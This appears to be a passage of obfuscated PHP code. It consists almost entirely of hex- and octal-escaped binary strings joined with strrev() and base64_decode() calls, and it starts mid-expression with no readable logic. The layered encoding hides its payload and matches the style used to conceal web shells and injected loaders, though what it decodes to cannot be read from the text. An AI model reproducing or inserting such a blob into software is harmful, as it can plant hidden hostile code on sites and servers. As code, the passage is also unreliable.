\x5f\xef\xac\x6f\x0\xff\x67\x37\x41\xe4\x13\x2d\xf5\xf5\x65\x28\xf5\xf5\x2d\xe8\xff\x38\x1\x9d\xd4\x92\xe\xb5\xa6\x80\xf9\x4b\x19\xd\x41\x18\x51\x14\x52\x21\xc2\xe6\xf3\x6a\xa1\x44\x5\x20\xd0\x5f\xc8\x9d\x4c\xb\x9d\xe8\x73\x85"."\xed\xdc\x5c\x49\x81\xad\x23\x31\xc5\xde\xd2\x6e\x2d\x63\x19\x14\xba\x18\xc0\x99\x4d\xc3\x40\xa\x1\xc3\x81\x5a\x4e\x7b\x92\x5e\xf0\x2\x34\x3e\xd0\xa0\x1e\xfe\x42\x8a\xec\x22\xe6\x62\x15\xf6\x56\xf1\x63\x2e\xda\x83\x22\x50\x3c\x75"."\x37\x59\x9a\xe5\xfb\x0\xa\x56\xc6\x24\xab\x3a\x4\x8\x87\x1c\x50\x4a\x12\xfc\xe9\xc0\xa8\x78\xf3\x89\x92\x99\x66\x34\x8a\xe5\x98\xbd\xc\x8c\xf6\xb2\x92\x2a\x91\x50\x56\x1b\x89\xf3\xe5\xd\x46\x8f\x65\x31\xd4\x27\x70\x13\x42\x89"."\x85\xb5\x9e\x74\xc\x65\x7c\x94\x38\xe8\x35\x21\xb9\xa2\x43\xf6\x26\x43\x6a\xce\x62\xc4\x10\x17\xca\x16\x1d\x74\x2\xfe\x2\x65\x58\x3a\xac\xf8\xd4\x9d\x7c\x0\x8a\x3c\x2e\xde\x7b\xc8\x7f\x1b\x7a\xe2\x1\x6b\x5\xb4\x4c\x16\x7a\x52"."\327\270\51\101\331\313\45\64\26\251\174\373\54\234\177\121\330\4\230\354\170\214\102\374\24\200\357\207\275\314\263\215\120\200\75\311\226\307\223\22\136\346\60\270\113\33\57\363\136\45\372\271\301\116\174\204\213\130"."\203\70\115\344\176\255\150\31\254\365\45\75\347\52\352\132\6\214\204\41\324\13\302\103\225\301\14\275\34\263\2\22\153\220\210\47\2\241\312\5\175\24\202\20\25\73\301\7\133\75\306\26\5\124\176\372\40\0"."\255\112\21\102\202\227\271\102\26\201\160\73\322\47\154\46\221\41\223\265\14\270\317\261\102\130\315\276\207\204\350\66\324\44\17\217\10\66\50\4\215\353\200\300\363\0\361\40\125\325\274\204\166\140\157\360\373\76"."\x2b\xbc\x8c\xca\xc8\xc\x69\xa5\xe2\x3d\x9a\x42\xd6\xb4\xbf\x9e\x72\x3e\xd\x5c\x48\xb1\x60\xe3\xd9\x1\x96\x78\x3c\xb\x27\x4d\x17\x7b\xdb\xa2\x2\x75\x58\x29\xa0\x6c\xa8\xd1\x9c\x81\x5\xb4\x30\x2e\x21\xc4\x90\xb6\x80\xb\x79\x82"."\344\262\262\55\152\327\50\100\374\317\244\54\214\372\252\53\60\7\322\260\63\160\357\343\170\205\57\220\114\54\213\213\136\116\272\222\351\214\15\304\210\256\14\240\360\15\2\122\300\5\342\50\345\233\75\332\70\340"."\153\262\273\331\125\57\325\54\121\201\314\65\142\110\275\121\151\246\253\161\256\264\44\270\144\346\214\132\11\110\177\71\145\211\222\130\250\232\356\346\246\131\256\246\231\122\315\302\256\150\117\267\103\202\166\115\122\47".strrev('¹‡ë½¾.Z‘uÊ'."\0".'ÿaqÊ¡qfá~B:×¢Op‹’UÖZr"Ìæ¹74f>­œnâ¼µÕ›ÉZµ&')."\210\106\46\230\51\350\41\64\61\43\322\231\40\352\125\342\176\36\342\132\351\300\132\54\104\30\340\270\22\174\365\310\162\141\170\324\231\224\313\203\251\310\247\64\134\62\4\122\203\121\106\130\120\13\75\47\76\37"."\265\104\115\261\73\377\376\230\61\120\27\163\367\50\51\125\156\327\106\161\264\37\375\40\165\126\250\33\130\13\243\323\377\227\150\135\154\200\352\207\301\17\166\51\174\307\346\236\26\362\165\70\71\72\21\346\210\263"."\150\356\362\234\124\14\171\264\344\137\240\345\323\322\243\366\15\42\16\343\227\40\160\330\13\107\1\210\16\76\266\102\2\276\317\43\150\220\54\270\114\375\107\327\122\245\44\55\62\144\211\25\123\351\305\342\106\325"."\107\246\20\22\326\304\27\237\106\201\264\316\132\244\307\12\3\150\232\103\50\152\7\206\325\131\332\206\141\323\247\115\363\7\73\230\16\51\307\30\155\254\37\260\306\346\327\364\27\322\3\363\153\153\140\306\325\4"."\x86\x4b\xa1\xdd\x4b\x9d\x5d\x58\xaa\x22\x7e\xd5\xd2\xbd\xd3\xb5\xc4\xa0\x5b\x25\x1b\x45\x37\xa1\x1f\x54\xb7\x79\xf3\x6a\x5c\x75\xb5\x6d\x6d\x7c\x1f\xe9\x86\x44\x68\x29\x81\xd5\x19\xfa\xf1\x2c\x2f\xdb\x12\x9\x53\x64\x9d\xf9\xfc\x74"."\x3\x81\x44\x1f\x2b\xfe\xd7\x39\x15\x8c\x4e\x32\xc3\x8b\xc9\xff\x36\xa7\x3b\xe0\x23\x1d\xde\x3f\x80\x3\xf3\x40\x9f\x1c\xd7\x36\x50\x57\xdb\xdf\x56\x1\xc2\xf2\x85\x74\x65\xb8\x62\x93\x41\xbf\xb1\xf1\x8e\x91\xd7\xc5\x62\x64\x69\x8b"."\321\127\315\210\16\143\214\50\61\122\175\103\246\177\110\233\122\23\213\305\122\310\77\73\323\100\47\20\346\322\277\146\52\210\67\212\30\30\100\21\246\122\274\171\375\262\63\215\352\332\6\220\231\142\362\74\127\135".base64_decode('29E0M7o8oQSyz2RqHtZVx74+2uEHf4wojyHFo3sVggy4stPfGw1EA36ieT9pr8l770P6gGi57jOZFg==')."\11\72\67\66\132\137\17\376\346\200\77\31\374\45\301\137\12\222\160\314\0\377\316\6\177\40\245\11\100\233\224\330\150\163\2\374\201\324\131\340\167\26\304\112\203\277\146\316\105\332\332\170\301\240\265\36\147\7"."\150\166\245\302\101\226\66\106\341\102\5\341\246\77\61\110\371\46\75\233\200\317\137\50\62\235\103\162\216\351\354\10\217\252\301\117\306\164\70\357\340\254\343\323\243\6\32\150\42\74\70\133\53\324\204\343\62\114"."\113\43\46\242\341\276\377\214\45\116\143\326\254\351\116\127\175\103\143\323\214\346\231\263\250\7\226\102\51\257\350\364\304\305\215\174\160\66\301\37\65\105\177\370\131\216\365\304\272\150\120\177\3\171\146\326\17\170"."\43\135\366\5\355\47\103\324\27\33\122\306\172\350\1\5\134\52\323\360\272\213\244\315\156\17\21\312\161\307\372\41\267\211\121\112\204\76\177\5\215\40\22\213\144\351\211\352\264\372\306\124\13\373\307\6\243\42"."\x51\xc6\x70\x9\x75\xc5\x6f\x61\xc9\x25\xd0\x26\x7a\x68\x39\x58\xcc\xf0\x8a\x45\x85\x67\xb3\x0\x11\x18\x5e\x7c\x45\x2b\x1c\x89\xc3\x12\x85\xb2\x85\x13\x4b\x14\x87\x6f\x8d\x51\xd9\x7\x3\x72\x9\xfa\xd8\x81\x98\x26\x80\x17\xb8\x80"."\274\224\166\371\227\6\72\134\136\370\14\130\244\310\54\311\215\160\47\121\271\145\1\124\171\27\334\365\25\224\34\275\141\206\227\211\141\266\306\201\46\71\6\213\112\306\121\54\144\34\31\65\355\110\344\213\16\123"."\115\247\341\77\16\60\206\216\142\62\345\60\206\63\16\45\55\217\72\106\224\104\221\272\70\327\33\35\212\236\166\14\245\222\216\124\122\167\244\100\1\5\175\304\121\120\322\16\15\300\365\221\106\107\21\204\15\0"."\x93\xc1\x9f\xa1\x13\x17\x24\xc3\x6a\x4a\xd1\xc0\xde\xca\xd0\x72\x25\xa4\xfd\x35\x3a\x1\x7c\x8c\x8a\x41\x14\xb2\xd4\xd2\xb\x81\xe\x5f\xbd\x6b\x69\x98\xa5\x8e\x3a\x26\x48\xb0\x17\xb3\xec\x7b\x8b\x19\xb3\x14\xb3\xcc\x5e\x8c\x98\xe8".base64_decode('o77pF+AhoXH8spmcg77uyX+j+aIL/iExQoGIDjTmC6AvCEFjw0UR0XXUGBdGNF0FkrFcuSJBe6KhpQ==')."\315\21\246\62\46\242\106\110\212\120\67\122\21\226\102\342\106\71\246\245\25\232\36\145\157\377\44\124\63\4\366\341\62\127\344\304\243\11\340\106\274\10\155\132\205\44\10\4\330\41\165\224\232\227\57\160\341\53"."\152\216\137\204\211\16\6\327\345\21\133\32\41\102\333\44\250\74\101\100\71\160\166\320\302\340\301\150\34\236\213\12\55\133\340\12\164\371\302\56\124\36\62\177\344\337\206\367\256\272\350\337\0\177\224\11\330\14".strrev('ıÎCƒ!ÿy@ä¡²àÈ•TC:›k)K5FB´ågª†Jk.iAÇkıæprz—àË.rÓ“1').strrev('y‡–Q¹£®ƒ‡	4YŠ¯˜…Q?…–ÃÀr[ÇœàaL’”  T<J“VJF+|\'')."\26\52\26\205\131\53\55\100\144\264\111\300\31\251\35\251\7\20\32\324\113\352\20\167\36\244\30\157\260\47\324\27\365\373\134\25\221\50\120\270\300\20\251\262\102\62\74\215\6\73\163\164\36\71\101\256\11\120"."\220\236\32\50\214\237\240\212\231\312\123\73\240\376\252\250\336\50\242\227\45\12\200\100\241\251\71\237\357\120\163\25\26\242\357\101\3\111\45\303\7\72\230\333\35\331\373\260\2\112\40\22\104\15\5\253\24\177"."\167\130\374\142\105\204\45\131\325\124\332\345\134\331\247\120\226\362\124\332\73\134\35\261\122\337\361\124\12\151\127\145\143\202\121\52\103\361\57\26\26\142\22\224\223\16\71\145\32\16\271\344\220\363\272\103\36\326"."\x1d\x9\xad\x30\xe4\x48\x19\x69\xf0\x67\x38\xc0\xd2\xb\x93\xd3\x39\x80\x98\x93\x1d\x39\xc0\xc0\x1c\x79\x35\xa5\x3a\xf2\x20\xa0\x9a\x8e\xd1\xbc\xc3\x68\xca\x93\x45\x38\x5f\x4\x89\xc5\x26\x87\x96\xd6\x1d\xfa\x10\x28\xd2\xc8\xc2\xb9"."\61\344\30\221\207\35\43\171\331\221\237\41\73\264\114\306\61\274\62\355\30\31\166\14\153\111\207\111\217\220\251\230\24\67\104\335\307\225\45\65\71\4\301\56\370\17\30\227\174\321\210\227\12\352\50\165\370\236"."\xd7\xb4\x61\x29\x3f\x9c\x4d\xfd\x27\x7c\xac\x37\x6d\xc7\xc7\x42\x9\xe0\x7b\xba\x66\xc\xc9\x2e\xa4\x83\xa5\xe8\xf6\xe5\x88\xa5\xf7\x13\x84\xd5\x50\x49\x11\x8c\xb6\x5c\x2c\x3a\x80\x40\x93\x2\xdb\x4e\x64\x2d\x3c\x60\xcf\xc9\xeb\xd3".base64_decode('z1ZBqugVh5KamANXhn4CywmCEgtMxCtXXLecojPHKPA4RRRRicgFiqNegPDKKJg4YJSJVkb75y2gfg==')."\x20\x6f\xf\x37\xac\x86\xff\x36\xae\x96\x1\x6f\x1d\xd6\xf4\x84\x6a\xd0\x77\xbc\x58\xd3\x7\x44\x61\xf3\xbf\xcf\x24\x32\xc3\xff\x21\x17\x97\x4f\x33\x4a\x41\xff\x9f\xbf\x2a\x64\x1a\x53\xa8\x89\xd1\x7f\x9f\x9d\xe7\x1\x1d\x45\xdd\xf0"."\374\17\35\5\63\305\305\47\365\10\222\341\52\252\111\310\251\135\365\56\176\355\202\304\32\72\367\146\200\131\72\354\110\317\200\123\155\30\114\263\141\107\136\33\6\63\132\165\350\371\341\204\43\77\64\14\2\120".strrev('(%¬>¨ç¡(y"ÈoÀâ‚b?şÙ€vÁGiÃ¨€¨OÄÁè¦SGF™M»™4‘	'."\n".'ÂyƒÎf')."\xdb\x81\x2a\xc6\x2e\xad\x0\x1f\xae\x80\xcf\x3a\xb8\x46\xe0\xd1\x9d\x63\x22\xe1\xba\x1c\x3f\x8b\x4e\xde\xca\x33\x8c\xfd\xaf\x6c\xc0\x61\x9d\xb0\x49\x72\xa8\x16\x17\xac\x30\xfe\x6b\x16\x61\x2b\xb\x27\xb\x25\xe1\xda\xa2\x3d\x8c\x30"."\x23\x17\xb8\x48\x2b\xb0\x94\x8\x13\x1c\x4c\xfe\xe4\x68\x24\x33\xbc\xb1\x49\xc6\x73\x9a\x36\x54\x2a\xa\xac\x0\xa7\xe2\x5d\xb6\xe1\xea\xaf\x6f\x58\xdd\x30\xe0\xe2\xd3\xfb\x3f\x61\xe2\x62\xff\x13\x16\x62\xc\x2\x12\xef\x19\x8c\x8e"."\xd2\xe3\xdf\x5f\x45\xf2\x25\x21\x83\xb0\x87\xe4\x7c\x93\xf3\xcb\xd5\x22\xbf\x5c\x4d\x98\xdd\x80\x45\xf8\xb5\x13\x7\xe3\xba\x30\x1\x76\x2\x3d\xb\x25\xbf\x65\x5c\xb7\x5f\x7\x7b\x46\x71\x5e\x55\xd8\x3d\x10\x91\x8b\x32\x63\x62\x6"."\x6c\x58\x2a\xc2\x26\xdf\xf7\x60\xd9\xd8\xbc\x85\xb9\x5b\x58\x74\x9e\x2d\xde\x96\x9d\x70\x19\x18\xd\xa\xe\x97\xf1\x73\x3d\x99\x55\xe9\xbd\x14\xba\x20\x11\x54\x75\xb\x74\x6b\xa0\xa4\x4\x79\x1f\x64\xc8\xa5\x74\xa5\x20\xbc\xb8\x4".strrev('6ÖÖò‰ô‚»ÄF¼ƒİ°wg`á.h0	.U§3™¯ëBçÇnçXİ¸¶¯ÀªÏäN{ĞhvZ')."\x43\xbc\x40\xcb\x2\x72\x72\x82\x7a\x64\xd8\x53\xa0\x4b\x64\x1d\xaa\x49\x38\xa2\x44\x73\x50\x22\xa9\x92\x56\x60\x57\x60\xe4\xd8\x6c\x4\xa3\xe2\x48\xa8\x2b\x14\xf7\xf4\x45\xbb\x4\xcf\x1b\xc\x14\x22\x7a\x3e\xe8\x2d\x76\x8\x9\x86"."\x3\xcb\x3d\xdc\x83\x16\x68\x18\x3d\x4e\x5a\xb2\x64\x89\x13\x1e\xc7\x43\xcb\x9a\x24\x7a\xc6\xbd\x1d\x26\x4a\x90\x4f\xe6\x5b\xab\x86\xb4\x54\x32\xa7\x95\x52\x55\xbc\x40\x77\x83\xab\x5e\x9a\x51\xdf\x20\xf5\x15\xa8\x86\x29\xdd\x3d\x85"."\x74\x39\x93\x97\xe1\x8b\x98\x4e\xe1\xc1\x4c\x2f\xc\x3a\xbd\x58\x4f\xc5\x9e\x68\x79\x14\x9a\x7e\x1c\x27\x81\xad\x6\xa0\x3a\x61\x43\x1d\x1c\x56\x74\xc1\x4c\x82\xbe\x73\x4e\x7e\x7b\x82\x8b\x89\xba\xb3\x37\x18\x22\xc7\xb\x3d\xb\x99"."\xb6\x8b\x4f\x29\x52\x99\xda\x5b\xf6\x80\x36\x52\xd0\x19\xcd\xe7\xe6\x32\xf5\x1f\xe1\xd0\x74\x9e\xaf\xa5\xa8\x6b\xc5\xb4\x5a\x48\x49\x0\xa7\x60\xb4\xf8\x5a\xab\x7c\x9e\xc5\x2d\x55\x6d\x20\x49\xce\xe5\x60\xaa\xe4\x6e\x9b\xe7\xe6\x88"."\144\304\102\341\140\250\43\300\174\156\204\340\20\220\323\63\254\152\355\364\223\211\103\76\145\121\220\257\2\75\135\305\25\344\253\120\235\252\44\352\224\17\231\32\341\140\3\365\217\53\32\2\23\125\123\150\140\47".strrev('ZÛ’bŒ®YÒX×pi4$¥BIÂ¯aáïòà# ‰¶‰v&Ø0AlÛ’–G ­t?> D³2Œô')."\207\265\113\271\341\262\344\114\251\272\202\274\341\300\314\66\264\212\37\245\272\125\310\55\203\340\64\261\44\114\162\105\60\245\346\146\340\11\146\241\1\212\104\327\171\266\201\46\321\110\153\25\261\135\244\363\2\362"."\312\252\66\314\26\347\105\132\224\121\70\250\240\311\155\101\364\130\171\257\146\42\345\252\171\156\61\15\40\22\335\336\66\66\134\20\203\2\121\161\260\325\250\52\155\126\242\205\333\371\26\211\275\64\317\51\266\144"."\246\11\301\56\226\365\261\26\251\302\213\365\271\212\312\364\46\52\221\60\261\236\150\305\111\13\155\255\100\325\132\147\317\234\121\137\357\310\227\14\323\251\53\326\227\203\141\107\111\344\170\261\47\342\304\23\333\271"."\x58\x5\xfc\xc0\x47\x4d\xc6\x91\xb\x86\x16\x89\x4c\x4\x87\x44\xe7\x7\xe\x85\x3c\x51\x6f\x97\x43\x42\xc4\xea\x90\x3a\xfd\x51\x0\xee\x3\xff\x60\x53\x6\x87\x4\xe7\x35\x48\x6\xf3\xdc\x21\x41\x83\x6d\x87\xd4\xd7\x8b\x7f\xb9\x72"."\x3a\xe8\x3b\x4c\x16\xc8\xa8\x8\x75\x25\x88\x43\x8a\xa6\x44\xe3\x26\x51\x92\x4\x67\x2c\x54\xc2\x21\xbd\x8e\x1\x74\x44\xf3\x2d\x4b\xd4\x42\x53\x23\xd4\x4d\xc7\x66\x53\x70\x1b\x4f\x88\x1\x70\xc7\x92\x5e\x68\xc1\x2e\xa1\xc\x67\x5e"."\x4d\x82\x45\x1f\x2c\xb8\x4e\x40\x12\x2d\x50\xd3\xcf\x5a\x6\xbd\xe7\xfc\xff\x97\x0\x6b\x41\x15\xe4\xff\xff\xa5\x40\x15\xa\x8f\x9\x16\x99\x44\xc9\x54\x8c\xff\xa9\xc\xca\xe0\x58\x57\x61\xe5\xa5\x36\xb2\x2a\x34\x48\x8d\xf5\xf5\x52"."\160\41\104\43\51\223\205\134\264\223\11\57\300\343\103\26\161\254\266\221\222\207\351\333\304\131\70\311\324\102\221\272\310\104\214\12\14\174\170\111\230\371\303\323\254\313\101\324\302\255\111\303\122\224\123\223\321\206".strrev('ÛÄMŒ§À-M¨uÁOCq±Æ%sÉ0LbAlbæ'."\n".'úT²³YÚ4À¬>Úà;XÇy¸)ıº')."\60\204\41\150\43\5\205\116\172\230\37\332\25\272\21\320\315\31\63\314\207\21\131\76\342\122\264\55\200\213\126\40\12\205\131\133\5\255\310\332\350\254\320\212\362\312\222\302\340\55\266\131\302\332\214\62\61\62"."\260\365\30\305\262\164\55\43\27\134\44\174\41\320\31\105\337\340\14\250\200\127\210\26\11\172\231\166\2\176\62\134\306\222\313\150\1\16\350\204\74\161\302\105\374\173\127\126\254\353\113\27\126\104\154\70\270\324".base64_decode('6R8tgjoqKbBSg/38mMUw2X0ctkTBt3p1tU4aYB6jyCUQcaIwjJYpwqShsErCw2A+QF+yqQY7oJFiaw==')."\351\64\74\255\40\61\202\205\266\233\64\13\336\113\322\130\61\47\27\24\203\306\100\126\121\356\135\54\146\134\154\315\310\120\151\262\160\364\56\126\75\216\5\145\2\31\215\27\225\34\76\113\101\146\162\24\76\66".base64_decode('ATyZ06FrupQYV/PwBlJmldSBRA+40RDFyeiKUrBAErmSYgHIuWJWRhAMIM+PeBNub8bt1d1eshPfBQ==').strrev('Ì¶LÖ•	ì£hüâ†­2Ìğ6ª'."\n".'ÉèWİR¤P˜¨U¸pŠé¨ÉézFñPKGÑnœEªÉ’Jìÿ')."\12\37\201\67\340\350\242\203\60\13\376\224\55\304\111\347\250\126\130\240\247\63\336\321\35\10\305\321\76\40\330\33\365\164\333\22\0\143\215\6\274\145\340\366\40\365\7\154\153\132\42\157\325\132\123\13\110\26".base64_decode('CHGnRCAqG8wfLnEzSfJA8wIcnDsvobup7WZC2BUZeTnHlKLcVOXdbZSIHEEc2XQHyARzkz1it5qg5g==')."\117\336\356\345\240\11\320\337\110\60\354\11\57\343\16\221\101\112\324\23\236\40\5\346\41\156\10\251\147\274\271\13\26\54\240\217\323\46\163\330\270\23\232\31\260\73\167\0\205\47\130\112\71\124\56\307\204\132".base64_decode('fMgKynJnH5Z1D25BhcTlanGCRLVIX1QpUk33YoleiLMjOcG70CzyO0p+E+OE9mWd6B8k6as3qkHO2A==').strrev('&]öI«2n©Ú¡ÅË’¬ŒJ>àÛìrĞq¤d*}4R¹´'."\n".'Sj…Êò@y/H¡gã”rÁ†}Pã2')."\x4e\xfc\xd\x5e\xc\x1\x97\xa8\xce\x7\xe4\xb0\xa0\x82\x64\xe6\x91\xe9\x2e\x68\xc\x70\xe7\x1b\xc4\x1c\xd1\xe5\x22\x8a\x40\xd0\x67\x3\xe0\x38\x56\x24\xe4\xd5\x94\x3a\x63\x40\x47\xf\x71\xc0\xc\x5\x17\x99\x50\x9c\x92\xe0\xfa\x83"."\54\51\54\136\167\26\152\51\62\154\55\330\325\116\112\31\235\53\41\77\122\304\323\171\145\327\115\350\63\22\370\14\64\56\223\260\211\260\105\311\20\43\224\101\132\54\272\212\70\241\274\302\323\352\33\352\5\253"."\220\200\327\37\211\37\33\201\176\124\273\3\324\213\217\65\41\0\322\242\341\11\122\74\341\211\122\202\355\307\116\220\342\245\233\14\153\112\167\60\30\21\35\106\331\252\327\27\22\134\114\222\115\64\134\340\351\13"."\x4c\xbd\x7d\xdd\x84\x7f\xc5\x8\x5\xc7\x8\xc3\xf6\x12\x15\xa9\x58\x69\x5a\xfd\xc\x6a\x30\xc4\x5f\x74\x85\x7d\x13\x17\xde\x4a\xc7\xc7\x6e\x38\xac\xa1\x6d\x1c\xe\x4b\x49\x19\x1b\xd6\x24\x14\x2c\x3a\x28\x29\xe8\x38\x16\xd6\x4e\x32".base64_decode('gEBN2f1U6BXa7a5xTa89empehMXqIDBW557aR6oxlcMAwtEM7j6upmp1da2rribWUMtUwGLUGi0WKw==')."\x11\x5\xaa\x81\x55\x33\xd6\x70\x4f\x96\xb1\x7e\x57\x5d\x6c\xe0\x68\x41\x23\x6d\x15\x0\xac\x61\x80\x91\x2c\x3d\x53\x43\xbe\x34\x18\x96\x51\x57\xd3\x5f\x55\x3d\xe0\xaa\xeb\x3f\x2e\x16\x1b\x80\xc1\x5a\x0\x6b\x81\xf0\x58\xc4\x55\x57"."\xeb\x98\x7f\xb4\xbb\x4f\x35\x44\x7c\xec\x69\x7b\x42\x1c\xd2\xe5\xd4\x1e\xad\xc8\x2e\x8\xa0\x5c\xa3\x82\xad\x14\xb2\xc6\x10\x75\x72\x43\x7e\xc0\x94\x5\x27\x7c\x66\xbe\x28\x90\x2d\x3e\x8b\x13\x95\xdb\x31\x84\x2e\x29\x25\xba\xf6\xa1"."\x20\x35\x0\x2b\x72\x25\x7f\xab\x42\x2e\x8b\x5a\x66\x4b\xbd\xd4\xe\xe4\x39\x8b\x3d\xb6\xc5\x53\xa0\x50\x3b\x7d\xba\x50\x50\x5c\x74\xc4\x89\x20\xe2\x8b\x2b\x30\x2e\x3c\x20\x2c\xd4\x15\x8\x75\x82\x7b\x19\x58\x10\xf5\xc9\x44\xa4\x5"."\331\310\116\340\217\10\273\10\1\15\20\352\204\275\114\302\123\1\141\241\355\262\71\367\42\173\255\362\76\304\141\100\310\144\152\41\74\360\51\264\371\241\236\123\270\136\371\110\202\364\0\354\343\270\355\203\314\330"."\x3b\x27\xec\x59\x7d\x56\x19\x86\x6b\x72\xd1\x28\x95\xa3\x92\x72\x11\xde\xf9\xa4\xf0\xe9\x3a\xe8\x78\xf2\x6d\x16\xea\xb\x41\x97\x7a\x90\x13\xc4\xe9\x41\xab\x0\xa\xf4\x6\xe2\x91\xc0\x72\x7f\x59\x2\xf4\x19\x5d\x39\x5\xac\xf7\xd1"."\0\25\177\4\170\157\20\171\261\263\300\373\172\27\366\6\227\124\102\215\366\204\270\54\41\44\171\75\275\321\270\260\161\305\73\32\260\57\143\133\32\252\364\236\324\223\115\215\11\66\315\230\167\67\52\360\223\231"."\102\327\174\356\244\141\324\311\154\0\350\246\310\307\175\255\220\154\350\164\226\124\1\171\236\41\31\304\243\36\61\331\41\125\74\350\141\273\56\142\14\142\73\303\114\250\5\231\372\306\315\323\157\347\231\105\35\164"."\73\105\135\366\40\353\67\52\31\210\367\337\105\166\211\110\114\316\164\220\252\43\223\160\341\140\257\140\206\225\214\30\355\326\230\336\37\132\315\53\24\1\137\70\22\214\125\340\116\306\223\64\113\342\353\111\334\360"."\34\306\72\271\223\127\301\324\317\331\40\261\26\305\161\311\70\62\135\110\300\332\346\25\314\5\155\76\30\4\27\261\310\6\75\122\112\60\317\72\66\373\76\352\200\126\22\55\353\250\33\131\130\0\172\360\7\266"."\300\20\323\100\261\360\301\160\336\62\61\13\372\146\131\26\234\6\15\340\70\53\23\123\14\250\324\325\107\305\256\112\51\25\76\205\222\204\36\115\322\315\36\365\222\107\72\211\367\225\111\373\273\321\111\137\370\22".strrev('µÅOìô:”ÑŒLX‹g¢ĞØˆ×âŸÂ„wĞhãhA¹¬GÀŠ{È/ IFÎ¹Ò9óĞı').base64_decode('A9G7QH2V0nFnwWSfxWGoDQFMeWs6+qJYmTR+A8riONFWiI7TfAp3a4Jy8XZw36sABPY+yFcO7xjuFQ==').strrev('K'."\r".'NŒ©¡((ò=ã­F³sÏ@ïÅ–R…©­ì$iMƒóÜKmó=g¹`1ª8;)RzÄ=Ds¿')."\4\73\253\264\344\146\40\206\65\242\44\30\333\46\214\264\53\344\146\240\166\332\115\354\275\34\142\154\15\137\53\20\13\15\22\231\165\4\133\121\21\136\332\302\374\167\322\55\321\110\136\115\112\335\301\116\270\37".strrev('¥¾ày	 İJÊ,X©‹	ëtEØ5—3Î%„è(1º Ÿ”¡ÁàGÜ™Ö·B\\JbŒ¥"÷')."\2\166\216\37\175\10\310\144\237\143\305\37\123\340\105\201\120\143\41\103\251\102\155\10\176\345\57\240\163\122\21\33\35\44\115\124\171\265\60\254\32\52\147\16\64\307\230\130\72\167\373\41\164\65\164\156\306\155"."\xd3\x59\x17\xb3\xb2\xcb\x6c\xa6\x79\x1c\xe3\x90\x97\xd3\x4\xeb\x5c\x3c\x3c\xe2\x6b\x82\x45\xea\xc8\x86\x5c\xd2\x53\x4a\x20\x51\xe1\xbe\xbb\xa8\xcb\xaa\xa1\x8\x0\xcb\x5b\x83\x4\x3f\x8e\xb1\x30\x2c\x1c\xe8\xec\x8a\xfe\xd7\xc5\xa9"."\x29\xfe\x6e\xa0\xad\x32\x6a\x8a\xca\x8b\xcc\x87\x38\x90\x12\x51\x79\x58\xf7\xc7\x52\x5\xa8\xde\xc0\x39\x45\xc0\xe7\x40\x8f\xba\x71\xa7\xb4\x28\x8\x24\x4a\x7\x3c\xe0\x42\x15\x70\x8\x2f\x6\xa3\xbb\x64\x32\x89\x54\xd\x99\xc1\x12"."\353\117\14\13\4\343\370\375\137\34\165\333\205\344\64\62\51\105\66\112\202\233\44\67\75\231\144\76\305\341\1\265\237\72\114\201\21\156\265\312\275\312\122\327\272\260\0\362\101\130\43\154\311\254\152\350\215\62".base64_decode('avFK/TPSRuGo3RdvVpSmy8qCsvbE5YB8EjfyZwhSq1SPfEVwn6rSPPqyAf8EehjOny+aFqPsLtXgLw==')."\x94\x20\x61\x83\x6f\xaa\xa0\x4\xa7\xe5\xc7\xca\x0\x16\xab\xff\x6e\x5a\xd\xe6\xda\x15\x1a\xb4\x14\xd2\x9a\xd8\x6a\xc4\xe4\xc0\x5a\xe1\x40\x1\x3f\xe0\x41\x38\x84\xad\xbe\x1d\xf0\x74\xdc\xc\x21\x8a\xea\x56\x86\x15\x6b\x39\x13\x16".base64_decode('atiXCS69gIkP7VS4qjSFCLKKhfGiiEC5yG5WeA+A/kInPUymhfUVCiTWVjHyS5m3vWgwkl6izUJJHg==')."\x46\xcb\x12\x7b\x14\xae\x3e\x47\xea\xea\xb0\x2d\x1b\xd0\x37\x9e\x5c\x60\x1c\xa\x8e\x27\x40\xc2\xfe\x91\x40\x80\xcf\x2a\x9a\x26\x90\xf\x73\x4b\xc5\x76\xac\xc8\x17\x2d\x3b\xb9\x6\xab\x77\x14\x70\xb8\x8c\x3\xcb\x1f\x90\x37\xf0\x58"."\xfb\x98\x18\x16\x9d\xfc\xa2\x7a\x45\x99\x91\x8e\x9a\x62\x23\x24\xde\xe6\x3b\x69\x2a\xd4\x4d\xa3\x1c\x82\x93\x2f\x4e\x15\xc8\x99\xb1\x1d\x31\x37\x36\xd\x8\x63\xef\x99\x2e\xec\x84\x4\xa7\xe8\x60\x1b\xc1\x5c\xe3\x5a\xd0\x8\xd3\x0"."\133\255\11\335\345\20\231\0\273\316\51\25\2\370\65\7\13\124\27\266\51\242\233\145\354\44\210\73\312\47\350\340\153\41\354\25\210\64\133\54\222\172\146\102\77\160\43\3\146\54\63\51\167\227\173\162\202\336"."\x3d\xa9\x88\x21\x78\xc1\x25\xe\xb6\x5c\xe2\x3e\x82\x20\x48\xf3\x24\x3e\xc0\x96\x9\x4\xc5\x34\x38\x2b\x51\x0\xcd\x4a\x51\xd8\xac\xc\xb5\xcc\x4a\x84\xc2\x48\xe\x3d\xe1\xc9\xa8\xf\xf6\x28\xf9\xf1\x29\x69\x26\x86\xc3\x38\xdf\xaf"."\x89\x6f\xd9\x60\x32\xf2\x30\xa9\x85\x16\x8e\x7e\x21\x67\x74\xe0\xc6\x39\x18\xa5\xab\x46\x37\xd2\xf1\x34\x22\x58\x1a\x75\xc0\xfb\x51\xf0\x83\x77\x14\x86\x83\xbf\x79\xe0\xc0\x77\x1d\xc8\xb0\xc8\x4e\x67\x39\xee\x4e\xb\x74\x35\x6f\x1c".base64_decode('rGlUbKhFCrYLwKy3bBnC9h6NauW+LrgLq0Ipz72GgYh1Q1DWYKGFJT3nQBrKDvpso607hDrETaGNTA==')."\370\264\215\124\205\336\375\217\245\23\167\311\110\376\7\362\23\366\27\202\223\132\320\335\120\145\64\325\102\222\140\3\316\117\335\361\373\260\105\373\342\260\54\237\152\154\152\236\43\156\271\371\310\161\67\104\344\66".strrev('y²MaA£‚¨Dè@X¸ÉYgù%OÍ_ûæ6ê`XRy3ëÕ¢Q©8­(ú$Ò•’FEÓÑSh„').strrev('“À,r>«1åú:Né2£Ü$©ëºÏÂ|*‚…ĞènÔ0Ï˜›ÿ¢Ô¨ŸBß­>×Œ?Á¾Í Ó').strrev('ßn‡VÈ‘ÜZ´	¼ /p^…aÜ'."\r".'÷Ğ¨[¾ÿØAøŞUÏ”®ğ±¬BÁ